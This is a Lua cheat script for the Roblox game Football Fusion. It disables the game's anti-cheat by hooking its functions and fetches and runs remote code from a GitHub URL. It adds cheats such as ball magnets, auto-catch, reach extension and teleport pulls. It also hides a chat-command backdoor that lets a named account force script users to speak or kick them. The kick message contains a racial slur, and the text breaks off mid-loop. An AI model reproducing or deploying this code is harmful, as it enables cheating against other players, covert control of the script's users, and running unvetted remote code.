local allowedPlaces = {
    [8206123457] = true,
    [8204899140] = true,
    [17541256525] = true
}

if not allowedPlaces[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Wrong Game Bitch Nigga Check Supported Games")
end

-- // Celaris Premium (New Feature)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

local ownerNames = {
    ["R0cketLucky2020"] = true
}

-- Check if player is an owner
local function isOwner(name)
    return ownerNames[name:lower()] == true
end

-- Find player by partial name (Username or DisplayName)
local function findPlayerByName(nameFragment)
    nameFragment = nameFragment:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then -- Prevent self-kick
            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
                return plr
            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
                return plr
            end
        end
    end
    return nil
end

-- Handle commands
local function handleCommand(message, speaker)
    if not isOwner(speaker.Name) then return end

    local args = message:split(" ")
    local cmd = args[1]:lower()

    if cmd == ":talk" then
        local say = message:sub(#args[1] + 2)
        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
            chatRemote.SayMessageRequest:FireServer(say, "All")
        end

    elseif cmd == ":kick" and args[2] then
        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
        local targetPlayer = findPlayerByName(targetName)

        if targetPlayer then
            if targetPlayer == LocalPlayer then return end -- Never kick yourself
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Youâ€™ve been kicked",
                Text = "The owner removed your access.",
                Duration = 5
            })
            task.wait(2)
            LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
        end
    end
end

-- Connect to all existing and future players
local function connectPlayer(plr)
    plr.Chatted:Connect(function(msg)
        handleCommand(msg, plr)
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    connectPlayer(plr)
end

Players.PlayerAdded:Connect(connectPlayer)




-- Executor Check
local function BadExecutors()
    return string.match(getexecutorname(), "Solara")
       or string.match(getexecutorname(), "Zorara")
       or string.match(getexecutorname(), "Wind")
       or string.match(getexecutorname(), "Celery")
       or string.match(getexecutorname(), "Scythex")
       or string.match(getexecutorname(), "Nezur")
       or string.match(getexecutorname(), "Xeno")
end

local function GoodExecutors()
    return not BadExecutors()
end

if not LPH_OBFUSCATED then
    function LPH_JIT(Function) return Function end
    function LPH_JIT_MAX(Function) return Function end
    function LPH_NO_VIRTUALIZE(Function) return Function end
end

-- Anti-Cheat Bypass
LPH_NO_VIRTUALIZE(function()
    if hookmetamethod and not BadExecutors() then
        if game.PlaceId == 8204899140 or game.PlaceId == 17541256525 then
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local ReplicatedFirst = game:GetService("ReplicatedFirst")

            local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
            local ExpectedPath = LocalPlayer:GetFullName() .. ".PlayerScripts.PlayerScriptsLoader.PlayerModule.LocalScript"

            if ReplicatedFirst:FindFirstChild("LocalScript") then
                ReplicatedFirst:FindFirstChild("LocalScript"):Destroy()
                print(ExpectedPath)
            end

            local GarbageCollection = getgc(true)
            local Hooks = {}
            local FunctionList = {}
            local Handshake = nil

            local Iterator = table.foreach

            local function IsACItem(Function)
                return debug.info(Function, "s") == ExpectedPath
            end

            local function ACLine(Function)
                return debug.info(Function, "l")
            end

            Iterator(GarbageCollection, function(_, Item)
                if type(Item) == "function" and IsACItem(Item) then
                    table.insert(FunctionList, Item)
                end
            end)

            Iterator(GarbageCollection, function(_, Function)
                if type(Function) == "function" and IsACItem(Function) then
                    local Line = ACLine(Function)
                    if table.find({42, 51, 61}, Line) then
                        hookfunction(Function, function() end)
                    end
                end
            end)

            Iterator(FunctionList, function(_, Function)
                if type(Function) == "function" and debug.getinfo(Function).numparams == 7 then
                    Handshake = Function
                end
            end)

            task.wait()

            Hooks.debug_info = hookfunction(debug.info, function(...)
                local Args = {...}
                if not checkcaller() and (Args[1] == 2) and (Args[2] == "s") then
                    return "LocalScript"
                end
                return Hooks.debug_info(...)
            end)

            Hooks.__call = hookfunction(Handshake, function(...)
                local Args = {...}
                if Args[2] == 655 and Args[3] == 775 and Args[4] == 724 and Args[5] == 633 and Args[6] == 891 then
                    return Hooks.__call(...)
                elseif Args[2] == 760 and Args[3] == 760 and Args[4] == 771 and Args[5] == 665 and Args[6] == 898 then
                    return Hooks.__call(...)
                elseif Args[2] == 660 and Args[3] == 759 and Args[4] == 751 and Args[5] == 863 and Args[6] == 771 then
                    return Hooks.__call(...)
                end
            end)
        end
        AC_BYPASS = true
    end
end)()

if AC_BYPASS == true then
    print("Celaris Injected")
else
    print("Celaris failed to bypass!")
end

local Player = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")

-- // Library Toggle KeyBind
local keysus = "RightControl"
-- // Magnets
local Magnets = false
local ShowHitbox = false
local Range = 10
-- // Auto Catch
local autoCatchEnabled = false
local catchDelay = 0.01
local maxAutoCatchDistance = 10 -- default value
-- // Auto Swat
local autoSwatEnabled = false
local swatDelay = 0.01
local maxAutoSwatDistance = 10
-- // Auto Quarterback
local autoQBEnabled = false
-- // Reset After Catch
local resetAfterCatchEnabled = false
local resetAfterCatchDelay = 1
-- // Auto Rush
local autoRushEnabled = false
local autoRushDelay = 0.5
-- // Better FPS or Lower Graphics
local lowerGraphicsEnabled = false

-- // Angle Enhancer
local angleEnhancerEnabled = false
local angleBoostAmount = 5
local angleHoldTime = 1.5
local angleJumpBoosted = false
local sHeldTime = 0
local previousJumpPower = 50 -- This will get overwritten once you activate

-- // Players (Main Variables)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
-- // Block Reach
local toggleBlockReach = false
local blockReachAmount = 3 -- default slider value
local originalSize = Vector3.new(0.8500000238418579, 5, 1.5)
local blockPartName = "BlockPart"

local function applyBlockReach()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local blockPart = char:FindFirstChild(blockPartName)
	if blockPart and blockPart:IsA("BasePart") then
		blockPart.Size = Vector3.new(4.5, originalSize.Y, originalSize.Z + blockReachAmount)
	end
end
local function resetBlockReach()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local blockPart = char:FindFirstChild(blockPartName)
	if blockPart and blockPart:IsA("BasePart") then
		blockPart.Size = originalSize
	end
end
LocalPlayer.CharacterAdded:Connect(function()
	if toggleBlockReach then
		task.wait(1) -- wait for the character to fully load
		applyBlockReach()
	end
end)
-- // Tackle Reach
local tackleReachEnabled = false
-- // Auto Jump
local autoJumpEnabled = false
local jumpDelay = 0.01
local jumpMaxDistance = 10
-- // Original Materials for Lower Graphics
local originalMaterials = {}
-- // Stadium Original CFrame (Hide Stadium Logic)
local stadiumOriginalCFrame = nil
-- // Old Ball Trail Variable (not used)
local ballTrailEnabled = false
-- // CFrame Pull
local pullEnabled = false
local pullDistance = 10
local pullDelayEnabled = false
local pullDelayAmount = 0.1
local lastPossessTime = 0
-- // No JumpCooldown
local noJumpCooldownEnabled = false
local lastFakeJumpTime = 0
local jumpCooldownWait = 0.5
local jumpConnection
-- // Magnet Delay
local UseMagnetDelay = false
local MagnetDelay = 0.01 -- Default value
-- // Magnet Hitbox Customization
local HitboxColor = Color3.fromRGB(178, 178, 178) -- Default color
local HitboxTransparency = 0.8 -- Default transparency
-- // More Extra Player Logic
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
Player.CharacterAdded:Connect(function(char)
    Character = char
end)
-- Walkspeed and No Move Restrictions
local walkSpeedEnabled = false
local walkSpeedValue = 20  -- Default WalkSpeed
local jumpPowerEnabled = false
local jumpPowerValue = 50  -- Default JumpPower
local noMoveRestrictions = false

-- // Scramble Wall (Recoded so it'll work in Practice)
local workspace = game:GetService("Workspace")
local allowedPlaceIds = {
    [8204899140] = true,
    [17541256525] = true
}

local scrambleWall

if allowedPlaceIds[game.PlaceId] then
    scrambleWall = workspace:WaitForChild("ScrambleWall")
end
local toggle = false
local canCollideCheck = true -- Whether CanCollide should be checked
-- Function to disable CanCollide
local function disableCanCollide()
    if scrambleWall and scrambleWall:IsA("BasePart") then
        if scrambleWall.CanCollide then
            scrambleWall.CanCollide = false
        end
    end
end
-- // Remove Rain & Snow & Rain Sound Logic
local rainWasInitiallyEnabled = false
local snowWasInitiallyEnabled = false
local rainSoundWasPlaying = false

-- // CFrame full Function
local function pullToFootball()
    task.spawn(function()
        while pullEnabled do
            task.wait(0.1)

            local character = Player.Character
            if not character or not character:FindFirstChild("HumanoidRootPart") then continue end

            local hasFootball = character:FindFirstChild("Football") ~= nil
            if hasFootball then
                lastPossessTime = tick()
            elseif tick() - lastPossessTime < 1 then
                continue -- wait 1 sec after losing football
            end

            local closestFootball
            local shortestDistance = pullDistance

            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name == "Football" then
                    local possessed = false
                    local current = obj.Parent
                    while current do
                        if current:FindFirstChild("Humanoid") then
                            possessed = true
                            break
                        end
                        current = current.Parent
                    end

                    if not possessed then
                        local dist = (character.HumanoidRootPart.Position - obj.Position).Magnitude
                        if dist < shortestDistance then
                            shortestDistance = dist
                            closestFootball = obj
                        end
                    end
                end
            end

            if closestFootball then
                if pullDelayEnabled then task.wait(pullDelayAmount) end
                character:MoveTo(closestFootball.Position)
            end
        end
    end)
end

-- // WalkSpeed, JumpPower and No Move Restrictions Logic
local function applySettings()
    local character = game:GetService("Players").LocalPlayer.Character
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid

        -- WalkSpeed logic
        if walkSpeedEnabled then
            if humanoid.WalkSpeed == 0 and not noMoveRestrictions then
                return
            end
            humanoid.WalkSpeed = walkSpeedValue
        elseif noMoveRestrictions and humanoid.WalkSpeed == 0 then
            humanoid.WalkSpeed = 20
        else
            humanoid.WalkSpeed = 20
        end

        if jumpPowerEnabled then
            humanoid.JumpPower = jumpPowerValue
        else
            humanoid.JumpPower = 50
        end
    end
end

-- // More Important Variables
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // Jump CooldownActive Call
local jumpCooldownActive = false

-- // Jump Cooldown Setup
local function setupNoJumpCooldown()
    if typeof(jumpConnection) == "RBXScriptConnection" then
        jumpConnection:Disconnect()
        jumpConnection = nil
    end

    if noJumpCooldownEnabled then
        jumpConnection = UserInputService.JumpRequest:Connect(function()
            local character = LocalPlayer.Character
            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
            if not humanoid then return end

            task.wait() -- Give the game a frame to register legit jumps

            if not jumpCooldownActive and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                jumpCooldownActive = true
                lastFakeJumpTime = tick()

                task.delay(jumpCooldownWait, function()
                    jumpCooldownActive = false
                end)
            end
        end)
    end
end

-- // Auto Rush
-- Function to find the player holding the football
local function findFootballHolder()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Team ~= LocalPlayer.Team then -- ðŸ›‘ Make sure player is NOT on your team
            if player.Character and player.Character:FindFirstChild("Football") then
                return player
            end
        end
    end
    return nil
end


local function predictPosition(targetHrp, timeAhead)
    local targetVelocity = targetHrp.Velocity
    return targetHrp.Position + (targetVelocity * timeAhead)
end

local function autoRush(delay)
    while autoRushEnabled do
        local footballHolder = findFootballHolder()
        if footballHolder then
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local targetHrp = footballHolder.Character and footballHolder.Character:FindFirstChild("HumanoidRootPart")

            if hrp and targetHrp then
                local predictedPosition = predictPosition(targetHrp, delay)
                if predictedPosition.Magnitude > 0 then
                    character.Humanoid:MoveTo(predictedPosition)
                end
            end
        else
            local character = LocalPlayer.Character
            if character and character:FindFirstChild("Humanoid") then
                character.Humanoid:Move(Vector3.new(0, 0, 0), true)
            end
        end
        task.wait(0.1)
    end
end


-- // Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/exlehskee/Celaris/refs/heads/main/sdadas"))()
local Main = Library:Create("Celaris", "Football Fusion")

local CatchingTab = Main:CreateSection("Catching")
local AutomaticsTab = Main:CreateSection("Automatics")
local PlayersTab = Main:CreateSection("Player")
local VisualsTab = Main:CreateSection("Visuals")
local SettingsTab = Main:CreateSection("Settings")

-- Catching Tab
CatchingTab:CreateLabel("Catching")
CatchingTab:CreateToggle("Ball Magnets", function(value)
    Magnets = value
end)

CatchingTab:CreateToggle("Show Hitbox", function(value)
    ShowHitbox = value
end)

CatchingTab:CreateSlider(5, 20, "Magnets Size", function(value)
    Range = value
    for _, v in workspace:GetChildren() do
        if v.Name == "Football" and v:IsA("BasePart") then
            local sphere = v:FindFirstChild("RangeSphere")
            if sphere then
                sphere.Size = Vector3.new(Range, Range, Range)
            end
        end
    end
end)

CatchingTab:CreateToggle("Magnet Delay", function(value)
    UseMagnetDelay = value
end)

CatchingTab:CreateTextBox("Delay Amount", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        MagnetDelay = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Magnet Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateLabel("CFrame Pull")
CatchingTab:CreateToggle("Enabled", function(value)
    pullEnabled = value
    if value then
        pullToFootball()
    end
end)

CatchingTab:CreateSlider(5, 15, "Pull Distance", function(value)
    pullDistance = value
end)

CatchingTab:CreateToggle("Pull Delay", function(value)
    pullDelayEnabled = value
end)

CatchingTab:CreateTextBox("Delay", "Delay (0.01 - 1)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        pullDelayAmount = num
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Pull Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)


CatchingTab:CreateLabel("Hitbox Settings")

CatchingTab:CreateTextBox("Hitbox Color", "RGB CODE", function(v)
    local r, g, b = v:match("(%d+),%s*(%d+),%s*(%d+)")
    r, g, b = tonumber(r), tonumber(g), tonumber(b)

    if r and g and b and r <= 255 and g <= 255 and b <= 255 then
        HitboxColor = Color3.fromRGB(r, g, b)

        -- Update all current spheres
        for _, football in workspace:GetChildren() do
            if football.Name == "Football" and football:IsA("BasePart") then
                local sphere = football:FindFirstChild("RangeSphere")
                if sphere then
                    sphere.Color = HitboxColor
                end
            end
        end

        -- Notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Hitbox Color Updated",
                Text = string.format("New Color: RGB(%d, %d, %d)", r, g, b),
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Input",
                Text = "Please enter 3 numbers from 0-255 separated by commas",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateTextBox("Hitbox Transparency", "0 - 0.9", function(v)
    local num = tonumber(v)

    if num and num >= 0 and num <= 0.9 then
        HitboxTransparency = num

        -- Update all current spheres
        for _, football in workspace:GetChildren() do
            if football.Name == "Football" and football:IsA("BasePart") then
                local sphere = football:FindFirstChild("RangeSphere")
                if sphere then
                    sphere.Transparency = ShowHitbox and HitboxTransparency or 1
                end
            end
        end

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Transparency Updated",
                Text = "New Transparency: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Input",
                Text = "Enter a number between 0 and 0.9",
                Duration = 3
            })
        end)
    end
end)


-- // Automatics Tab

AutomaticsTab:CreateLabel("Auto Catch")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoCatchEnabled = value 
end)
AutomaticsTab:CreateTextBox("Catch Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 3 then
        catchDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Catch Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 3",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
    maxAutoCatchDistance = value
end)

AutomaticsTab:CreateLabel("Auto Swat")

AutomaticsTab:CreateToggle("Enabled", function(value)
    autoSwatEnabled = value 
end)
AutomaticsTab:CreateTextBox("Swat Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 3 then
        swatDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Swat Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 3",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
    maxAutoSwatDistance = value
end)

AutomaticsTab:CreateLabel("Auto Jump")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoJumpEnabled = value 
end)
AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        jumpDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Jump Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
    jumpMaxDistance = value
end)

AutomaticsTab:CreateLabel("Reset After Catch")

AutomaticsTab:CreateToggle("Enabled", function(value)
    resetAfterCatchEnabled = value 
end)

AutomaticsTab:CreateTextBox("RAC Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 2 then
        catchDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "RAC Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 2",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateLabel("Auto QB")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoQBEnabled = value 
end)

AutomaticsTab:CreateLabel("Auto Rush")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoRushEnabled = value
    if value then
        spawn(function()
            autoRush(autoRushDelay)
        end)
    end
end)

AutomaticsTab:CreateTextBox("Rush Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        autoRushDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto-Rush Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)


-- Player Tab:

PlayersTab:CreateLabel("Player")
PlayersTab:CreateToggle("WalkSpeed", function(value)
    walkSpeedEnabled = value
end)

PlayersTab:CreateSlider(20, 23, "WalkSpeed Amount", function(value)
    walkSpeedValue = value
end)

PlayersTab:CreateToggle("JumpPower", function(value)
    jumpPowerEnabled = value
end)

PlayersTab:CreateSlider(50, 60, "JumpPower Amount", function(value)
    jumpPowerValue = value
end)

-- // Angle Enhancer Logic
local function updateAngleEnhancer()
    if not angleEnhancerEnabled then return end

    local char = Player.Character
    if not char then return end

    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then return end

    local currentTime = tick()

    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
        if sHeldTime == 0 then
            sHeldTime = currentTime
        elseif currentTime - sHeldTime >= angleHoldTime and not angleJumpBoosted then
            previousJumpPower = humanoid.JumpPower
            humanoid.JumpPower = previousJumpPower + angleBoostAmount
            angleJumpBoosted = true
        end
    else
        if angleJumpBoosted then
            humanoid.JumpPower = previousJumpPower
        end
        angleJumpBoosted = false
        sHeldTime = 0
    end
end

PlayersTab:CreateLabel("Angle Enhancer")
PlayersTab:CreateToggle("Enabled", function(value)
    angleEnhancerEnabled = value

    if not value and angleJumpBoosted then
        local char = Player.Character
        if char then
            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
            if humanoid then
                humanoid.JumpPower = previousJumpPower
            end
        end
        angleJumpBoosted = false
        sHeldTime = 0
    end

    if value then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Angle Enhancer",
                Text = "If JumpPower is enabled you should probably turn it off so you're not blatant.",
                Duration = 4
            })
        end)
    end
end)

PlayersTab:CreateSlider(1, 10, "Angle Boost", function(value)
    angleBoostAmount = value
end)

PlayersTab:CreateSlider(1, 3, "Hold-Time", function(value)
    angleHoldTime = value
end)

-- // Run Service Heartbeat for the Angle Enhancer


PlayersTab:CreateLabel("Defense")

PlayersTab:CreateToggle("Tackle Reach", function(value)
    tackleReachEnabled = value
end)

PlayersTab:CreateToggle("Block Reach", function(value)
	toggleBlockReach = value
	if toggleBlockReach then
		applyBlockReach()
	else
		resetBlockReach()
	end
end)

PlayersTab:CreateSlider(3, 10, "Reach Amount", function(value)
	blockReachAmount = value
	if toggleBlockReach then
		applyBlockReach()
	end
end)

PlayersTab:CreateLabel("Miscellaneous")

PlayersTab:CreateToggle("No Move Restrictions", function(value)
    noMoveRestrictions = value
end)

PlayersTab:CreateToggle("No Jump Cooldown", function(value)
    noJumpCooldownEnabled = value
    setupNoJumpCooldown()
end)


-- VisualsTab

VisualsTab:CreateLabel("Game Visuals")
VisualsTab:CreateToggle("Better FPS", function(value)
    lowerGraphicsEnabled = value
    handleGraphics(Player.Character, value)
end)

VisualsTab:CreateToggle("Hide Stadium", function(value)
    local stadium = workspace:FindFirstChild("Models").Stadium
    if stadium and stadium:IsA("Model") then
        if stadium.PrimaryPart then
            if value then
                if not stadiumOriginalCFrame then
                    stadiumOriginalCFrame = stadium:GetPrimaryPartCFrame()
                end
                stadium:SetPrimaryPartCFrame(stadium.PrimaryPart.CFrame * CFrame.new(0, -500, 0))
            else
                if stadiumOriginalCFrame then
                    stadium:SetPrimaryPartCFrame(stadiumOriginalCFrame)
                end
            end
        end
    end
end)

VisualsTab:CreateLabel("Weather Visuals")
VisualsTab:CreateToggle("Remove Rain", function(value)
    local weather = workspace:FindFirstChild("SkyWeather")
    local sounds = workspace:FindFirstChild("Sounds")

    -- Handle Rain Particles
    if weather and weather:IsA("BasePart") then
        local rain = weather:FindFirstChild("Rain")
        if rain and rain:IsA("ParticleEmitter") then
            if value then
                rainWasInitiallyEnabled = rain.Enabled
                if rain.Enabled then
                    rain.Enabled = false
                end
            else
                if rainWasInitiallyEnabled then
                    rain.Enabled = true
                end
            end
        end
    end

    -- Handle Rain Sound
    if sounds and sounds:FindFirstChild("Rain") then
        local rainSound = sounds:FindFirstChild("Rain")
        if value then
            rainSoundWasPlaying = rainSound.IsPlaying
            if rainSound:IsA("Sound") and rainSound.IsPlaying then
                rainSound:Stop()
            end
        else
            if rainSoundWasPlaying and rainSound:IsA("Sound") and not rainSound.IsPlaying then
                rainSound:Play()
            end
        end
    end
end)

local snowStates = {} -- Table to track original states

VisualsTab:CreateToggle("Remove Snow", function(value)
    local weather = workspace:FindFirstChild("SkyWeather")
    if not weather or not weather:IsA("BasePart") then return end

    -- Get all descendants named "Snow" that are ParticleEmitters
    local snowEmitters = {}
    for _, descendant in ipairs(weather:GetDescendants()) do
        if descendant:IsA("ParticleEmitter") and descendant.Name == "Snow" then
            table.insert(snowEmitters, descendant)
        end
    end

    if value then
        -- Toggle ON: Store state & disable active ones
        snowStates = {}
        for _, snow in ipairs(snowEmitters) do
            snowStates[snow] = snow.Enabled
            if snow.Enabled then
                snow.Enabled = false
            end
        end
    else
        -- Toggle OFF: Re-enable only those that were originally enabled
        for snow, wasEnabled in pairs(snowStates) do
            if snow and snow:IsDescendantOf(workspace) and wasEnabled then
                snow.Enabled = true
            end
        end
    end
end)

VisualsTab:CreateLabel("Miscellaneous")
VisualsTab:CreateToggle("Remove QB Boundaries", function(value)
    toggle = value
end)
-- Source



task.spawn(function()
    while true do
        task.wait()

        if autoCatchEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest and closestDist <= maxAutoCatchDistance then
                task.wait(catchDelay)

                local targetKey = Enum.KeyCode.C
                game:GetService("VirtualInputManager"):SendKeyEvent(true, targetKey, false, game)
                task.wait(0.1)
                game:GetService("VirtualInputManager"):SendKeyEvent(false, targetKey, false, game)
            end
        end
    end
end)


-- // Remove the sphere when the football disappears from the workspac

task.spawn(function()
    while true do
        task.wait()

        if autoSwatEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest and closestDist <= maxAutoSwatDistance then
                task.wait(swatDelay)

                local vim = game:GetService("VirtualInputManager")
                vim:SendKeyEvent(true, Enum.KeyCode.R, false, game)
                task.wait(0.1)
                vim:SendKeyEvent(false, Enum.KeyCode.R, false, game)
            end
        end
    end
end)

-- // Remove the sphere when the football disappears from the workspac

task.spawn(function()
    while true do
        task.wait()

        if autoJumpEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest and closestDist <= jumpMaxDistance then
                task.wait(jumpDelay)

                local vim = game:GetService("VirtualInputManager")
                vim:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                task.wait(0.1)
                vim:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            end
        end
    end
end)

local lastHadFootball = false

task.spawn(function()
    while true do
        task.wait(0.1)

        if resetAfterCatchEnabled then
            local char = Player.Character
            if char and char:FindFirstChild("Football") and not lastHadFootball then
                lastHadFootball = true
                task.wait(resetAfterCatchDelay)

                if char:FindFirstChild("Humanoid") then
                    char.Humanoid.Health = 0
                end
            elseif char and not char:FindFirstChild("Football") then
                lastHadFootball = false
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait()

        if autoQBEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist <= 50 and dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest then
                char.Humanoid:MoveTo(closest.Position)
            end
        end
    end
end)


task.spawn(function()
    while true do
        task.wait(0.1)

        if not tackleReachEnabled then continue end

        local player = game:GetService("Players").LocalPlayer
        local character = player.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end

        local closest, closestDist = nil, math.huge

        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= player and plr.Team ~= player.Team then  -- âœ… skip teammates
                if plr.Character and plr.Character:FindFirstChild("Football") then
                    local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
                    if targetHRP then
                        local dist = (hrp.Position - targetHRP.Position).Magnitude
                        if dist < closestDist then
                            closestDist = dist
                            closest = targetHRP
                        end
                    end
                end
            end
        end

        if closest and closestDist <= 5 then
            local originalPos = hrp.CFrame
            for _ = 1, 5 do
                hrp.CFrame = closest.CFrame
                task.wait(0.01)
                hrp.CFrame = originalPos
                task.wait(0.01)
            end
        end
    end
end)


-- // Magnet loop
task.spawn(function()
    while true do
        task.wait()

        if not Magnets then continue end
